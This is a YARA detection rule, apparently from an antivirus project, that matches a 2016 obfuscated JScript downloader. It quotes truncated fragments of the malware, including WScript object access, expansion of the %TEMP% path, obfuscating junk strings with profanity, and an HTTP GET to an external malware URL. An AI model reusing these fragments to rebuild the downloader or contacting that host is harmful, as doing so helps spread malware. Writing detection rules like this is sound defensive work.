rule sig_20160428_011eb25804dd1d8932ed9f0bc66dc2cc {
  meta:
    description = "datamaliciousorder - file 20160428_011eb25804dd1d8932ed9f0bc66dc2cc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ce4be069bae6e554fc96ff9c6403df0888a247018f141e1307429cdbc1be2c11"

  strings:
    $s1  = "function FobZmyYqySwlIlgDqgLen(AgoZgyXteBwqUgtWjiXhh){VgkKonWtjKyePflLttPix[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function FobZmyYqySwlIlgDqgLen(AgoZgyXteBwqUgtWjiXhh){VgkKonWtjKyePflLttPix[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function FolZrhIvdKizPukUvyOmf() {return VgkKonWtjKyePflLttPix[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function CemUjmFqfBiiZgdSypDcu(UudQkjUivQmhSliNbpZhu, IfyGmgGgcEjmDfrAbzIrg){MbuDkuZxcNerCtwBoiEym = MbuDkuZxcNerCtwBoiEym * 1; " ascii
    $s5  = "var VgkKonWtjKyePflLttPix = function LfaYkaWwhUxtHncYepIvx() {return SxsAzmKiwJnoPpeLvkIta[XinYdpIfhSetLkmEdrLqb](\"WScript\"+\"" ascii
    $s6  = "return UudQkjUivQmhSliNbpZhu - IfyGmgGgcEjmDfrAbzIrg;};" fullword ascii
    $s7  = "BwkIwpIvuSgtDekOdjDis[RgwWxmRhaIdjAloMonApm](\"G\" + \"ET\", \"http://zahariev.myjino.ru/n8sja\", false);" fullword ascii
    $s8  = "var VgkKonWtjKyePflLttPix = function LfaYkaWwhUxtHncYepIvx() {return SxsAzmKiwJnoPpeLvkIta[XinYdpIfhSetLkmEdrLqb](\"WScript\"+\"" ascii
    $s9  = "var SxsAzmKiwJnoPpeLvkIta = this[\"WScript\"];" fullword ascii
    $s10 = "function FolZrhIvdKizPukUvyOmf() {return VgkKonWtjKyePflLttPix[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function CemUjmFqfBiiZgdSypDcu(UudQkjUivQmhSliNbpZhu, IfyGmgGgcEjmDfrAbzIrg){MbuDkuZxcNerCtwBoiEym = MbuDkuZxcNerCtwBoiEym * 1; " ascii
    $s12 = "function AgfHrfFtcGtsKugWtzSpj(){return MuaErbAekVxfCylRoaMdu + \"\";};" fullword ascii
    $s13 = "if (BwkIwpIvuSgtDekOdjDis[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function AkcPogOxnDbjZfnRqzAxz() {return ((RgiRuqMzyTorEbaAyzKrz == true) && (RgiRuqMzyTorEbaAyzKrz == HgsNhsEmoTvxHedKzdDfr)) ?" ascii
    $s15 = "function AkcPogOxnDbjZfnRqzAxz() {return ((RgiRuqMzyTorEbaAyzKrz == true) && (RgiRuqMzyTorEbaAyzKrz == HgsNhsEmoTvxHedKzdDfr)) ?" ascii
    $s16 = "var RgiRuqMzyTorEbaAyzKrz = false;" fullword ascii
    $s17 = "RgiRuqMzyTorEbaAyzKrz = true; " fullword ascii
    $s18 = "return CemUjmFqfBiiZgdSypDcu(1 == 1 ? EylTidZmxYkrCchYbtXzy : 0, 1 == 1 ? YltTdpVjwRucLyoSjtEjx : 0);" fullword ascii
    $s19 = "function SvaXxyGhqHjlPpsIriFem()" fullword ascii
    $s20 = "function EgqTabQffYepHqxEfpUyu(){return XinYdpIfhSetLkmEdrLqb;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}